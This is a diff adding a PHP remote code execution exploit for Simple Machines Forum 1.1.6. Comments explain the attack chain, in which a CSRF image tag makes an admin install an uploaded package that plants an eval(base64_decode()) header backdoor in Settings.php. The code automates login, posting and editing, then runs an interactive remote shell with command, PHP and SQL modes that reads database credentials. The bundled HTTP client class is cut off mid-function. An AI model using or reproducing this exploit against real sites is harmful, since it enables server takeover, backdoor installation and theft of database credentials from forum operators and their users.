@@ -1,0 +1,1530 @@
+<?php
+#
+# Simple Machines Forum (SMF) 1.1.6 Remote Code Execution Exploit
+#  Credits: Charles FOL <charlesfol[at]hotmail.fr>
+#   URL: http://real.olympe-network.com/
+#
+# Note: other versions are maybe vulnerable, not tested.
+#
+# SMF suffers from multiples vulnerabilities.
+# Combining some of them, we can obtain a remote code execution on the
+# remote host. I won't talk here about all of them, but I'll explain
+# how we can execute code.
+#
+# 0 - UPDATE (05/11/08)
+#
+# (Now,) SMF seems to replace "action=" by "action-" in every URL.
+# But SMF urldecode() GET data, so I replaced "action" by "%61ction".
+# Other little problems have been corrected.
+#
+# Thanks to Alessandro Tagliapietra for his report and his patience.
+#
+# It seems that many people can't use phpreter, so here is a little course :
+#
+# phpreter have 3 modes : cmd (bash), php, and SQL
+#
+# To switch to a mode just type "mode=<mode>" (replace <mode> by php, cmd or sql)
+#
+# In cmd mode, you can run bash commands, like "ls"
+# In php mode, you can exec php code like "echo 'abc';"
+# In sql mode, you can exec sql queries and view results, try "SHOW TABLES"
+#
+# I - Session Code
+#
+# SMF administration panel is secured by a "session code", a kind of
+# password that must be provided by the admin browser when the admin
+# is editing data.
+#
+# But the session code is not required for SMF package installation.
+# Just to be clear : you don't need the "session code" to install the
+# package, but you do need a valid admin session.
+#
+# II - Package Installation
+#
+# Package installation works this way :
+# - The admin tells an archive file, which can be either gzip or zip, to SMF
+# - SMF un(g)zip it, and analyse the XML files (yes, it work with XML)
+#   to add, replace or remove code from any SMF source code file.
+#
+# To precise an archive to SMF, the admin is supposed to go on this URL :
+# 
+# http://[website]/SMF/index.php?action=packages;sa=install2;package=[filename] (1)
+#
+# Since $_REQUEST['package'] is not checked, we can install any file
+# on the server, even if the file is not in the Packages/ dir.
+#
+# Using CSRF, we can make an admin to install whatever package we want.
+# That does not seem really interesting for now, but be patient =)
+#
+# III - File upload in SMF; Attachments
+#
+# SMF let users upload files in two cases :
+# - You can upload an image to be your avatar
+# - You can upload attachments to every post you submit
+#
+# Since uploaded images are checked, they don't interest us for now.
+# 
+# Attachments are not checked by SMF.
+# They are renamed and moved to the attachments/ directory.
+# They are renamed this way :
+# [id]_[name]_[ext][md5([name].[ext])]
+#
+# As you can see, there is no rand(), or other strange stuff :
+# we can easily find attachment name.
+#
+# The second part is more interesting now, no ?
+#
+# Now, we can submit a post with a gzip'ed attachment, and make the admin
+# click on a specific link, to install a package we uploaded ourself.
+#
+# I writed "click", so many of you may say "brr, that sucks".
+# So here come the wait-I've-not-finished part.
+#
+# IV - Wait-I've-not-finished part
+#
+# SMF allows us to display remote images in our posts, using [img]<url>[/img]
+# We can just set our image URL to ... (1) : when the admin will see our post,
+# the package will be installed.
+#
+# V - Classic Scenario
+#
+# 1. We submit a fantastic post containing our nasty-attached-gzip'ed package, ready
+#    to be installed.
+# 2. We guess the attachment name, that's pretty easy because we can retrieve the
+#    attachment ID.
+# 3. We modify our post, adding an [img](1)[/img], replacing [filename] by 
+#    ../attachments/[the_name_you_just_found]
+# 4. The administrator discover our fantastic post on his fantastic forum ...
+# 5. His browser discovers our image : it goes to the specified url to download it.
+#    wooops. The package is installed.
+#
+# VI - Exploit
+#
+# The exploit will login with your user account, and submit a new post/topic containing an
+# attachment, a gzipped package, which permits remote code execution once installed.
+# Then it will obtain the attachment ID, determine attachment name, and modify your topic to
+# add a remote image (using [img][/img]).
+# Then you'll have to wait for an admin to see your post ... and the package will be installed.
+#
+# VII - Notes
+#
+# - Do not forget to change SUBJECT and MESSAGE constants, to make your post a little more realistic.
+# - The current gzipped package is supposed to put PHP code at the end of Settings.php file.
+# - Code: if(isset($_SERVER['HTTP_SHELL'])) { print 1234567890;eval(base64_decode($_SERVER['HTTP_SHELL']));print 1234567890;exit(); }
+#
+# First run the exploit like this :
+# eg : php exploit.php -url http://localhost/forum/ -bid 2 -user tester:passwd
+# And when you think the admin viewed your post, run the shell :)
+# eg : php exploit.php -url http://localhost/forum/ -shell
+#
+# FOR EDUCATIONAL PURPOSE ONLY
+#
+
+new smf_poc();
+
+class smf_poc
+{
+	const SUBJECT = 'hello';
+	const MESSAGE = 'dudes ... I love your forum ;)';
+	
+	function smf_poc()
+	{
+		$this->header();
+		$this->gzip();
+		$this->loadparameters();
+		$this->wwwinit();
+		
+		if(!$this->shell)
+		{
+			# First of all, login
+			$this->login();
+			# Then submit a topic
+			$this->submit_post();
+			# Find attachment name and message id
+			$this->get_postinfo();
+			# and modify the post
+			$this->edit_post();
+			# finally ... wait.
+			$this->wait();
+		}
+		else
+			$this->shell();
+	}
+	
+	function header()
+	{
+		$this->msg();
+		$this->msg('  Simple Machines Forum (SMF) 1.1.6 Remote Code Execution Exploit');
+		$this->msg('    by Charles FOL <charlesfol[at]hotmail.fr>');
+		$this->msg();
+	}
+	
+	function msg($msg = '', $exit = 0)
+	{
+		print '# ' . $msg . "\n";
+		
+		if($exit)
+		{
+			$this->msg();
+			exit();
+		}
+	}
+	
+	function usage()
+	{
+		global $argv;
+		
+		$name = basename($argv[0]);
+		
+		$this->msg('usage : php ' . $name . ' -url [url] -bid [bid] -user [user]:[passwd]');
+		$this->msg('   OR   php ' . $name . ' -url [url] -shell');
+		$this->msg();
+		$this->msg('Parameters are :');
+		$this->msg(' -shell            Test if the shell is installed, and load phpreter');
+		$this->msg(' -bid (int)        The board ID were you want to submit the topic');
+		$this->msg(' -user user:passwd A valid user:password couple');
+		$this->msg(' -wait             Flood control time (default: 5)');
+		$this->msg();
+		$this->msg('eg : php ' . $name . ' -url http://localhost/forum/ -bid 2 -user tester:passwd', 1);
+	}
+	
+	# Get every needed parameters, and load defaults
+	function loadparameters()
+	{
+		$this->furl  = $this->getparameter('url');
+		$this->shell = $this->getoption('shell');
+		$this->wait  = $this->getparameter('wait', 5);
+		
+		if(!$this->shell)
+		{
+			$this->bid  = $this->getparameter('bid');
+			$this->user = $this->getparameter('user');
+		}
+	}
+	
+	# Patience ...
+	function wait()
+	{
+		$this->url->topic = $this->pid;
+		$this->makeurl();
+		
+		$this->msg();
+		$this->msg('Now, you just have to wait for an admin to see your post,');
+		$this->msg('then you will be able to launch a shell using -shell.');
+		$this->msg();
+		$this->msg('Post URL : ' . $this->murl, 1);
+	}
+	
+	# Check if a shell is available and launch phpreter
+	function shell()
+	{
+		$this->www->addheader('Shell', 'MTs=');
+		
+		$this->url->action = 'forum';
+		$this->get();
+		
+		if(!$this->match('(12345678901234567890)'))
+			$this->msg('Shell is not available', -1);
+		
+		$sql = array
+		(
+			'var_host'   => '$db_server',
+			'var_user'   => '$db_user',
+			'var_passwd' => '$db_passwd',
+			'var_db'     => '$db_name'
+		);
+		
+		$preter = new phpreter($this->murl, '1234567890(.*)1234567890', 'cmd', $sql);
+	}
+	
+	function wwwinit()
+	{
+		$this->www = new phpsploit();
+		$this->www->cookiejar(1);
+		$this->www->addheader('Referer', $this->furl . 'index.php');
+	}
+	
+	# Log in ...
+	function login()
+	{
+		$user = explode(':', $this->user);
+		
+		$this->url  = 'action=login2';
+		$this->data = 'user='.$user[0].'&passwrd='.$user[1].'&cookielength=-1';
+		$this->post();
+		
+		$this->location->action = 'login2';
+		$this->location->sa     = 'check';
+		
+		if($this->location())
+			$this->msg('Logged in as ' . $user[0]);
+		else
+			$this->msg('Can\'t log in', 1);
+	}
+	
+	# Get seqnum and sescode
+	function get_sessionvars()
+	{
+		$this->get();
+		
+		$this->scode = $this->match('name="sc" value="([0-9a-f]+)"', 1);
+		$this->sqnum = $this->match('name="seqnum" value="([0-9]+)"', 1);
+	}
+	
+	# Submit our post, containing our gzipped package
+	function submit_post()
+	{
+		# Flood control: let's sleep a little
+		
+		$this->msg('Waiting ' . $this->wait . ' secs (flood control)');
+		sleep($this->wait);
+		
+		# Obtain session vars
+		
+		$this->url->action = 'post';
+		$this->url->board  = $this->bid . '.0';
+		
+		$this->get_sessionvars();
+		
+		# and submit the post
+		
+		$this->url->action = 'post2';
+		$this->url->board  = $this->bid;
+		$this->url->start  = '0';
+		
+		$this->data = array
+		(
+			'subject'            => self::SUBJECT,
+			'message'            => self::MESSAGE,
+			'sc'                 => $this->scode,
+			'seqnum'             => $this->sqnum,
+			'icon'               => 'xx',
+			'topic'              => 0,
+			'notify'             => 0,
+			'lock'               => 0,
+			'sticky'             => 0,
+			'move'               => 0,
+			'additional_options' => 0,
+			'attachment[]'       => array
+			(
+				frmdt_filename => 'jpeg.jpg',
+				frmdt_type     => 'image/jpeg',
+				frmdt_content  => $this->GZIP,
+			)
+		);
+		
+		$this->post();
+		
+		# Check the submission
+		
+		$this->location->board = $this->bid;
+		
+		if($this->location())
+		{
+			$this->msg('Post successfully submitted');
+		}
+		else
+		{
+			$this->msg('Error while posting');
+			$this->msg('Try augmenting -wait parameter', 1);
+		}
+		
+		# Find the post id
+		
+		$this->url->board = $this->bid . '.0';
+		$this->get();
+		
+		$this->pid = $this->match('topic=([0-9]+)');
+		$this->pid = max($this->pid);
+	}
+	
+	# Get the avatar ID to obtain its full name, and get msg id
+	function get_postinfo()
+	{
+		$this->url->topic = $this->pid . '.0';
+		$this->get();
+		
+		$this->aid = $this->match('attach=([0-9]+)', 1);
+		$this->mid = $this->match('msg=([0-9]+)', 1);
+		
+		if($this->aid)
+			$this->msg('Got attachment name =)');
+		else
+			$this->msg('Unable to obtain attachment ID ...', 1);
+		
+		if(!$this->mid)
+			$this->msg('Unable to obtain message ID ...', 1);
+	}
+	
+	# Edit our precedent post : just add our "image".
+	function edit_post()
+	{
+		# Obtain session vars
+		
+		$this->url->action = 'post';
+		$this->url->topic  = $this->pid;
+		$this->url->msg    = $this->mid;
+		$this->url->sesc   = $this->scode;
+		
+		$this->get_sessionvars();
+		
+		# Build our CSRF
+		
+		$this->url->{'%61ction'} = 'packages';
+		$this->url->sa           = 'install2';
+		$this->url->package      = $this->aid . '_jpeg_jpg' . md5('jpeg.jpg');
+		$this->url->package      = '../attachments/' . $this->url->package;
+		
+		$this->makeurl();
+		
+		$img = '[img]' . $this->murl . '[/img]';
+		
+		# Edit the post
+		
+		$this->url->action = 'post2';
+		$this->url->sesc   = $this->scode;
+		$this->url->board  = $this->bid;
+		$this->url->msg    = $this->mid;
+		$this->url->start  = 0;
+		
+		$this->data = array
+		(
+			'topic'              => $this->pid,
+			'subject'            => self::SUBJECT,
+			'icon'               => 'xx',
+			'message'            => self::MESSAGE . $img,
+			'notify'             => '0',
+			'lock'               => '0',
+			'goback'             => '1',
+			'sticky'             => '0',
+			'move'               => '0',
+			'attach_del[]'       => '0',
+			'attach_del[]'       => $this->aid,
+			'post'               => 'Save',
+			'num_replies'        => '0',
+			'additional_options' => '0',
+			'sc'                 => $this->scode,
+			'seqnum'             => $this->sqnum,
+		);
+		
+		$this->post();
+		
+		if($this->location(';topic=' . $this->pid))
+			$this->msg('Post successfully edited, everything done.');
+		else
+			$this->msg('Unable to edit the post');
+	}
+	
+	# Find were we are redirected to
+	function location()
+	{
+		# SMF likes making a mess with URL, so ... let's consider
+		# all cases.
+		
+		$expr = '';
+		
+		$this->location = (array) $this->location;
+		
+		foreach($this->location as $key => $value)
+		{
+			$expr .= $key . '[,=]' . urlencode($value) . '(&|;|%26|%3B)';
+		}
+		
+		$this->location = null;
+		
+		$expr = substr($expr, 0, -13);
+		$expr = '#(Refresh|Location):.*' . $expr . '#i';
+		
+		$head = $this->www->getheader();
+
+		return preg_match($expr, $head);
+	}
+	
+	function match($expr, $one = 0)
+	{
+		# SMF likes making a mess with URL, so ... let's consider
+		# all cases.
+		
+		$expr = str_replace('\?', '[\?/]', $expr);
+		$expr = str_replace('=', '[,=]', $expr);
+		$expr = str_replace(';', '(&|;|%26|%3B)', $expr, $count);
+		$expr = '#' . $expr . '#is';
+		
+		$count++;
+		
+		$http = $this->www->getcontent();
+		
+		if(!$one && !preg_match_all($expr, $http, $match))
+			return false;
+
+		if($one && !preg_match($expr, $http, $match))
+			return false;
+		
+		return $match[$count];
+	}
+	
+	function getoption($option)
+	{
+		global $argv, $argc;
+		
+		foreach($argv as $arg)
+		{
+			if($arg == '-' . $option)
+				return true;
+		}
+		
+		return false;
+	}
+	
+	function getparameter($parameter, $default = false)
+	{
+		global $argv, $argc;
+		
+		for($i=0;$i<$argc;$i++)
+		{
+			if($argv[$i] == '-' . $parameter)
+				return $argv[$i+1];
+		}
+		
+		if($default === false)
+			$this->usage();
+		
+		return $default;
+	}
+	
+	function get()
+	{
+		$this->makeurl();
+		$this->www->get($this->murl);
+	}
+	
+	function post()
+	{
+		$this->makeurl();
+		
+		if(is_array($this->data))
+		{
+			$this->data['frmdt_url'] = $this->murl;
+			
+			$this->www->formdata($this->data);
+		}
+		else
+			$this->www->post($this->murl, $this->data);
+	}
+	
+	# Construct a valid URL using the url object/string.
+	function makeurl()
+	{
+		$url = '';
+		
+		if(is_object($this->url))
+		{
+			$url = '';
+			
+			$this->url = (array) $this->url;
+			
+			foreach($this->url as $key => $value)
+			{
+				$url .= $key . '=' . urlencode($value) . '&';
+			}
+				
+			$url = substr($url, 0, -1);
+		}
+		else 
+			$url = $this->url;
+			
+		$url = $this->furl . 'index.php?' . $url;
+		
+		$this->murl = $url;
+		
+		$this->url = null;
+	}
+	
+	# Our SMF package ...
+	function gzip()
+	{
+		$this->GZIP = ''
+		. "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x0b\xed\x56\xff\x4f"
+		. "\xda\x40\x14\xe7\x57\x4c\xfc\x1f\x9e\x64\x89\x98\x08\x6d"
+		. "\x01\xcb\x86\xa5\xc6\x29\x8b\x26\x7e\x8b\x34\x4b\x8c\x31"
+		. "\xe4\xa0\x87\xdc\x6c\xef\x9a\xde\x21\x92\x65\xff\xfb\xde"
+		. "\x5d\x71\x52\xdd\x37\x12\x37\x17\xc7\xa3\x69\xb9\xbb\xf7"
+		. "\x5e\xdf\xd7\xcf\x2b\xe3\x52\x91\x28\xaa\xde\xc5\x51\xe1"
+		. "\x4f\x91\x63\xdb\xae\xeb\x42\xc1\x36\xf4\xf0\x84\x8c\x6a"
+		. "\x8d\xad\x26\x38\x8e\x63\xd7\xeb\x76\xdd\x6d\xd6\x00\x1c"
+		. "\xdb\x6d\x3a\x50\xf8\x2b\x34\x46\xff\x53\x34\x29\x15\x42"
+		. "\x15\xfe\x3f\xf2\x76\x30\xf3\x70\x4b\x53\xc9\x04\x6f\x97"
+		. "\x9c\xaa\x5d\xda\xf1\x57\x57\xbc\xb5\xfd\xd3\xbd\xe0\xe2"
+		. "\xac\x03\xb1\x08\xd9\x90\x0d\x88\xc2\x73\xe8\x5e\x74\x83"
+		. "\xce\x31\x94\x46\x4a\x25\x2d\xcb\x9a\x4c\x26\x55\xc9\xe2"
+		. "\x24\xa2\x31\x19\x8c\x18\xa7\xb2\x2a\xd2\x6b\x0b\x35\x5a"
+		. "\xf3\x62\x25\xa3\xb0\x52\x81\x67\xfc\xad\xae\x14\x83\x11"
+		. "\x93\x80\x17\xe1\x40\xef\x88\xb6\x22\x6f\xec\x90\xe1\xce"
+		. "\x50\xa4\xd0\x3d\xfe\x00\x09\x19\xdc\x90\x6b\x34\x70\x75"
+		. "\x05\x45\x77\x83\xa0\x73\x12\x1c\x9e\x9e\xb4\xe0\x70\x08"
+		. "\x53\x31\x06\x92\x52\x50\xe9\x94\xf1\x6b\x50\x02\x58\xd6"
+		. "\x15\xa0\xf4\x2b\x62\xc2\xc7\xb8\x98\x6e\x1a\x46\x39\x12"
+		. "\xe3\x28\xd4\xbc\xa8\x47\x8d\xe8\xbd\x66\xcd\x86\x8f\xb4"
+		. "\x0a\x5a\x25\x53\x30\x61\xa8\x80\x0b\xfc\x23\xd2\x1b\x63"
+		. "\x07\x8a\x6f\x02\x9a\x49\x24\xbe\x8b\xdc\x50\x20\x10\x09"
+		. "\x71\x83\x7a\x88\x02\xad\x6a\x28\xa2\x48\x4c\xb4\x0d\x9a"
+		. "\x9d\x71\xbc\xc7\x99\x2f\x78\x19\x5b\xb2\x9d\x16\x8a\x14"
+		. "\x67\x39\x40\x97\xe5\xf7\x92\x10\x8a\x81\xb4\x32\xd3\x2b"
+		. "\x33\x77\xaa\xc9\x28\xd1\xee\xb7\x9f\x99\x4c\x48\x8f\x1f"
+		. "\x87\x5e\xc2\x00\x33\xd3\xa7\x30\x96\x34\xd4\x41\x35\xc9"
+		. "\x99\xce\xce\xa4\x40\x87\x32\xb7\xa7\x10\x0a\x98\xe0\x02"
+		. "\xb5\x60\x88\xd2\x6f\x11\xe5\x94\x86\x52\x73\xc4\x5a\x1c"
+		. "\x99\xf0\x6e\x82\x99\xa4\x22\xa1\x69\x34\x35\xc9\x84\x67"
+		. "\xad\xab\x8a\xaf\x75\x7a\xb9\x42\xc2\x7a\xe6\xb2\xbd\x68"
+		. "\xd1\x67\x62\x2d\x19\x0f\x7f\x25\xaa\xfb\xa3\x68\x1a\x24"
+		. "\x2b\xe9\xb9\xbc\xcf\x42\x20\x74\x1c\x75\x85\x48\x12\x63"
+		. "\xd9\xc8\x2c\x76\x8c\xc3\x5c\x01\x56\xb4\x9c\xc6\xf1\x6a"
+		. "\xe6\x45\xd1\x63\xa1\xdf\x27\xfd\x4f\x63\xc9\x5a\x7d\xc2"
+		. "\x39\x0d\x7b\x31\x8d\xfb\xd8\xea\x3d\x72\x4b\x10\xf5\x3c"
+		. "\x0b\x39\x34\xe3\xac\xfd\x7d\xbb\xea\x78\xd6\xfd\xc2\x64"
+		. "\xd5\x33\x4d\xc4\xf1\xad\xed\x52\x97\x2a\x85\xb5\x29\x75"
+		. "\x19\x19\x93\x8b\x9e\x4e\x83\x31\xd4\x2c\x8b\x9e\xa4\x24"
+		. "\x1d\x8c\x20\x11\x92\x29\x83\x27\x94\x87\x25\xb0\x66\xa7"
+		. "\x24\x0c\x7d\x6f\xed\x72\x6f\x7f\x37\xd8\xbd\x34\x5b\x6c"
+		. "\x58\x66\x52\x52\x55\x7e\xd3\xeb\x76\xce\x3f\x76\xce\x2f"
+		. "\xd7\x0f\x82\xe0\xac\xd7\x3d\xe8\x1c\x1d\xad\x5f\x6d\x6c"
+		. "\xc0\x67\x4c\x36\xe3\x0a\x9c\x5a\xbd\xb1\xe5\x36\xdf\xbe"
+		. "\xb3\xb7\xe9\x2d\x89\xca\x7d\x6c\x22\xb7\xd1\x0b\xe9\x40"
+		. "\x84\xf4\x87\xe2\xdb\x4f\x85\xef\x98\x2a\x6f\x6c\xc3\x97"
+		. "\xab\x2b\xdf\xb3\xb4\x45\xc6\x11\x2b\xe7\x89\x67\x69\xb7"
+		. "\x35\x6a\xe5\x52\x8a\x1b\xaf\x0e\xff\x1f\x17\xcf\x0b\xcc"
+		. "\x7f\x70\xdd\x7a\x36\xff\x1d\xd7\x75\xec\x06\xce\x7f\x67"
+		. "\xab\xb6\x9c\xff\xff\xc6\xfc\x9f\x2f\x90\x05\xe6\xff\xbc"
+		. "\x98\x99\xff\x39\x3d\xbf\x8d\xa8\x39\x35\x8b\x22\xaa\x86"
+		. "\x2d\xff\xbd\x41\x3e\x98\x21\x1f\xdc\x23\x9f\x39\x5b\x08"
+		. "\x24\xd5\x34\xa1\xfe\x3c\x1c\x78\x96\xd9\xfa\x09\x80\xa2"
+		. "\xf6\x6c\xf2\x66\x20\x93\xc3\x12\xf6\xf0\xe1\xfd\x04\x65"
+		. "\x10\x80\x1e\x04\xbd\x5c\x10\x5e\x23\x06\x2d\x69\x49\x4b"
+		. "\x7a\x19\xfa\x0a\x12\x1a\xc6\x57\x00\x10\x00\x00";
+	}
+}
+
+/*
+ * Copyright (c) Charles FOL
+ *
+ * TITLE:          PHPreter
+ * AUTHOR:         Charles FOL <charlesfol[at]hotmail.fr>
+ * VERSION:        1.3
+ * LICENSE:        GNU General Public License
+ *
+ */
+
+class phpreter
+{
+	var $url;
+	var $host;
+	var $port;
+	var $page;
+	
+	var $mode;
+	
+	var $ssql;
+	
+	var $prompt;
+	var $phost;
+	
+	var $expr;
+	var $data;
+	
+	/**
+	 * __construct()
+	 *
+	 * @param url      The url of the remote shell.
+	 * @param expr     The regular expression to catch cmd result.
+	 * @param mode     Mode: php, sql or cmd.
+	 * @param sql      An array with the file to include,
+	 *                 and sql vars
+	 * @param clear    Determines if clear() is called
+	 *                 on startup
+	 */
+	function phpreter($url, $expr='^(.*)$', $mode='cmd', $sql=array(), $clear=false)
+	{
+		$this->url  = $url;
+		$this->expr = '#' . $expr . '#is';
+		
+		#
+		# Set data
+		#
+		
+		$infos         = parse_url($this->url);
+		$this->host    = $infos['host'];
+		$this->port    = isset($infos['port']) ? $infos['port'] : 80;
+		$this->page    = $infos['path'];
+		
+		# www.(site).com
+		$host_tmp      = explode('.', $this->host);
+		$this->phost   = $host_tmp[ count($host_tmp)-2 ];
+		
+		# Set up MySQL connection string
+		$this->set_ssql($sql);
+		
+		# Switch to default mode
+		$this->setmode($mode);
+		
+		#
+		# Main Loop
+		#
+
+		if($clear)
+			$this->clear();
+
+		print $this->prompt;
+
+		while( !preg_match('#^(quit|exit|close)$#i', ($cmd = trim(fgets(STDIN)))) )
+		{
+			# change mode
+			if(preg_match('#^(set )?mode(=| )(sql|cmd|php)$#i', $cmd, $array))
+				$this->setmode($array[3]);
+			
+			# clear data
+			elseif(preg_match('#^clear$#i', $cmd))
+				$this->clear();
+			
+			# else
+			else print $this->exec($cmd);
+			
+			print $this->prompt;
+		}
+	}
+	
+	/**
+	 * set_ssql()
+	 * Build $ssql var
+	 */
+	function set_ssql($sql)
+	{
+		$this->ssql = '';
+		
+		$sql = (object) $sql;
+		
+		# is there something to include ?
+		
+		if(isset($sql->include))
+			$this->ssql .= 'include(\'' . $sql->include . '\');';
+			
+		# mysql_connect: host, user, passwd
+			
+		$this->ssql .= 'mysql_connect(';
+		
+		foreach(array('host', 'user', 'passwd') as $key)
+		{
+			if(isset($sql->{'var_' . $key}))
+			{
+				$this->ssql .= $sql->{'var_' . $key} . ',';
+			}
+			else
+			{
+				$this->ssql .= "'" . $sql->{$key} . "',";
+			}
+		}
+		
+		$this->ssql  = substr($this->ssql, 0, -1);
+		$this->ssql .= ');';
+		
+		# mysql_select_db
+		
+		if(isset($sql->var_db))
+			$this->ssql .= 'mysql_select_db(' . $sql->var_db . ');';
+		elseif(isset($sql->db))
+			$this->ssql .= 'mysql_select_db(\'' . $sql->db . '\');';
+			
+		# basic display for mysql results
+		
+		$this->ssql .= '$s=str_repeat(\'-\',50)."\n";';
+		$this->ssql .= '$q=mysql_query(\'<CMD>\') or print($s.mysql_error()."\n");';
+		$this->ssql .= 'print $s;';
+		$this->ssql .= 'if($q)';
+		$this->ssql .= '{';
+		$this->ssql .=     'while($r=mysql_fetch_array($q,MYSQL_ASSOC))';
+		$this->ssql .=     '{';
+		$this->ssql .=         'foreach($r as $k=>$v) print " ".$k.str_repeat(\' \', 20-strlen($k))."| $v\n";';
+		$this->ssql .=         'print $s;';
+		$this->ssql .=     '}';
+		$this->ssql .= '}';
+	}
+	
+	/**
+	 * clear()
+	 * Clear ouput, printing "\n"x50
+	 */
+	function clear()
+	{
+		print str_repeat("\n", 50);
+		return 0;
+	}
+	
+	/**
+	 * setmode()
+	 * Set mode (PHP, CMD, SQL)
+	 */
+	function setmode($newmode)
+	{
+		$this->mode   = strtolower($newmode);
+		$this->prompt = '['.$this->phost.']['.$this->mode.']# ';
+		
+		switch($this->mode)
+		{
+			case 'cmd':
+				$this->data = 'system(\'<CMD>\');';
+				break;
+			case 'php':
+				$this->data = '';
+				break;
+			case 'sql':
+				$this->data = $this->ssql;
+				break;
+		}
+		
+		return $this->mode;
+	}
+
+	/**
+	 * exec()
+	 * Execute any query and catch the result.
+	 */
+	function exec($cmd)
+	{
+		if($this->data != '')
+			$shell = str_replace('<CMD>', addslashes($cmd), $this->data);
+		else
+			$shell = $cmd;
+
+		$shell = base64_encode($shell);
+		
+		$packet  = "GET " . $this->page . " HTTP/1.1\r\n";
+		$packet .= "Host: " . $this->host . ( $this->port != 80 ? ':' . $this->port : '' ) . "\r\n";
+		$packet .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14\r\n";
+		$packet .= "Shell: $shell\r\n";
+		$packet .= "Connection: close\r\n\r\n";
+		
+		$fp = fsockopen($this->host, $this->port, $errno, $errstr, 30);
+		
+		fputs($fp, $packet);
+		
+		$recv = '';
+		
+		while(!feof($fp))
+			$recv .= fgets($fp, 128);
+		
+		fclose($fp);
+		
+		# Remove headers
+		$data    = explode("\r\n\r\n", $recv);
+		$headers = array_shift($data);
+		$content = implode("\r\n\r\n", $data);
+		
+		# Unchunk content
+		if(preg_match("#Transfer-Encoding:.*chunked#i", $headers))
+			$content = $this->unchunk($content);
+		
+		# Find results
+		preg_match($this->expr, $content, $match);
+		
+		$match = $match[1];
+		
+		# Add a \n if there is not
+		if(substr($match, -1) != "\n")
+			$match .= "\n";
+		
+		return $match;
+	}
+	
+	/**
+	 * unchunk()
+	 * Remove chunked content's sizes which are put by the apache
+	 * server when it uses chunked transfert-encoding.
+	 */
+	function unchunk($data)
+	{
+		$dsize  = 1;
+		$offset = 0;
+		
+		while($dsize>0)
+		{
+			$hsize_size = strpos($data, "\r\n", $offset) - $offset;
+			
+			$dsize = hexdec(substr($data, $offset, $hsize_size));
+			
+			# Remove $hsize\r\n from $data
+			$data = substr($data, 0, $offset) . substr($data, ($offset + $hsize_size + 2) );
+			
+			$offset += $dsize;
+			
+			# Remove the \r\n before the next $hsize
+			$data = substr($data, 0, $offset) . substr($data, ($offset+2) );
+		}
+		
+		return $data;
+	}
+}
+
+/*
+ * 
+ * Copyright (C) darkfig
+ * 
+ * This program is free software; you can redistribute it and/or 
+ * modify it under the terms of the GNU General Public License 
+ * as published by the Free Software Foundation; either version 2 
+ * of the License, or (at your option) any later version. 
+ * 
+ * This program is distributed in the hope that it will be useful, 
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of 
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
+ * GNU General Public License for more details. 
+ * 
+ * You should have received a copy of the GNU General Public License 
+ * along with this program; if not, write to the Free Software 
+ * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
+ * 
+ * TITLE:          PhpSploit Class
+ * REQUIREMENTS:   PHP 4 / PHP 5
+ * VERSION:        2.0
+ * LICENSE:        GNU General Public License
+ * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
+ * FILENAME:       phpsploitclass.php
+ *
+ * CONTACT:        gmdarkfig@gmail.com (french / english)
+ * GREETZ:         Sparah, Ddx39
+ *
+ * DESCRIPTION:
+ * The phpsploit is a class implementing a web user agent.
+ * You can add cookies, headers, use a proxy server with (or without) a
+ * basic authentification. It supports the GET and the POST method. It can
+ * also be used like a browser with the cookiejar() function (which allow
+ * a server to add several cookies for the next requests) and the
+ * allowredirection() function (which allow the script to follow all
+ * redirections sent by the server). It can return the content (or the
+ * headers) of the request. Others useful functions can be used for debugging.
+ * A manual is actually in development but to know how to use it, you can
+ * read the comments.
+ *
+ * CHANGELOG:
+ *
+ * [2007-06-10] (2.0)
+ *  * Code: Code optimization
+ *  * New: Compatible with PHP 4 by default
+ *
+ * [2007-01-24] (1.2)
+ *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
+ *  * New: multipart/form-data enctype is now supported 
+ *
+ * [2006-12-31] (1.1)
+ *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
+ *  * New: You can now call the getheader() / getcontent() function without parameters
+ *
+ * [2006-12-30] (1.0)
+ *  * First version
+ * 
+ */
+
+class phpsploit
+{
+	var $proxyhost;
+	var $proxyport;
+	var $host;
+	var $path;
+	var $port;
+	var $method;
+	var $url;
+	var $packet;
+	var $proxyuser;
+	var $proxypass;
+	var $header;
+	var $cookie;
+	var $data;
+	var $boundary;
+	var $allowredirection;
+	var $last_redirection;
+	var $cookiejar;
+	var $recv;
+	var $cookie_str;
+	var $header_str;
+	var $server_content;
+	var $server_header;
+	
+
+	/**
+	 * This function is called by the
+	 * get()/post()/formdata() functions.
+	 * You don't have to call it, this is
+	 * the main function.
+	 *
+	 * @access private
+	 * @return string $this->recv ServerResponse
+	 * 
+	 */
+	function sock()
+	{
+		if(!empty($this->proxyhost) && !empty($this->proxyport))
+		   $socket = @fsockopen($this->proxyhost,$this->proxyport);
+		else
+		   $socket = @fsockopen($this->host,$this->port);
+		
+		if(!$socket)
+		   die("Error: Host seems down");
+		
+		if($this->method=='get')
+		   $this->packet = 'GET '.$this->url." HTTP/1.1\r\n";
+		   
+		elseif($this->method=='post' or $this->method=='formdata')
+		   $this->packet = 'POST '.$this->url." HTTP/1.1\r\n";
+		   
+		else
+		   die("Error: Invalid method");
+		
+		if(!empty($this->proxyuser))
+		   $this->packet .= 'Proxy-Authorization: Basic '.base64_encode($this->proxyuser.':'.$this->proxypass)."\r\n";
+		
+		if(!empty($this->header))
+		   $this->packet .= $this->showheader();
+		   
+		if(!empty($this->cookie))
+		   $this->packet .= 'Cookie: '.$this->showcookie()."\r\n";
+	
+		$this->packet .= 'Host: '.$this->host."\r\n";
+		$this->packet .= "Connection: Close\r\n";
+		
+		if($this->method=='post')
+		{
+			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+			$this->packet .= 'Content-Length: '.strlen($this->data)."\r\n\r\n";
+			$this->packet .= $this->data."\r\n";
+		}
+		elseif($this->method=='formdata')
+		{
+			$this->packet .= 'Content-Type: multipart/form-data; boundary='.str_repeat('-',27).$this->boundary."\r\n";
+			$this->packet .= 'Content-Length: '.strlen($this->data)."\r\n\r\n";
+			$this->packet .= $this->data;
+		}
+
+		$this->packet .= "\r\n";
+		$this->recv = '';
+
